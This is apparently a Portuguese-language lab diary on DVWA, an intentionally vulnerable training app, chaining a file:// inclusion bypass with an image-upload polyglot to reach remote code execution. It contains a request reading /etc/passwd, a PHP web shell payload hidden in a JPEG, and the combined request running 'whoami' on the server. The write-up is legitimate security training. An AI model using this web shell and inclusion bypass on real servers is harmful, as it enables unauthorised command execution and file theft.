# DVWA - File Inclusion + File Upload (High) — Diário de Execução

## Contexto

O objetivo foi explorar as vulnerabilidades de File Inclusion e File Upload no nível HIGH do DVWA, entendendo como as proteções funcionam e como podem ser contornadas em conjunto.

---

## File Inclusion (HIGH)

O sistema valida o parâmetro `page` com file como nome inicial, restringindo os arquivos a nomes que comecem com file

### Bypass

Uso do wrapper:

file://

Exemplo:

/vulnerabilities/fi/?page=file:///etc/passwd

Funciona porque:

- começa com "file"
- passa na validação
- permite leitura de arquivos locais

---

## Limitação

Não é possível executar código diretamente sem controlar o arquivo incluído.

---

## File Upload (HIGH)

Validações aplicadas:

- extensão: jpg, jpeg, png
- tamanho < 100kb
- getimagesize()

### Problema

getimagesize() apenas verifica se é uma imagem válida, mas não impede código PHP adicional.

---

## Problema encontrado

Imagens estavam sendo rejeitadas.

Causa:

- arquivo não era JPEG válido (ex: jpg.webp)
- inconsistência de MIME

---

## Correção

Criei uma imagem válida do zero no GIMP.

Upload passou normalmente.

---

## Payload

Código inserido na imagem:

<?php system($_GET['cmd']); ?>

Arquivo continua válido como imagem.

---

## Upload

Arquivo salvo em:

/hackable/uploads/

---

## Exploração final

Uso combinado com FI:

/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/arquivo.jpg&cmd=whoami

---

## Resultado

Retorno:

www-data

Confirma execução de comandos no servidor.

---

## Observação

Output aparece misturado com HTML pois o include insere conteúdo bruto.

---

## Conclusão

File Upload permite envio de arquivos poliglotas (imagem + PHP).

File Inclusion permite inclusão via file://.

A combinação resulta em execução remota de código.

---

## Conclusão final

O nível HIGH não elimina a vulnerabilidade, apenas adiciona barreiras.

A exploração depende da combinação de múltiplas falhas.
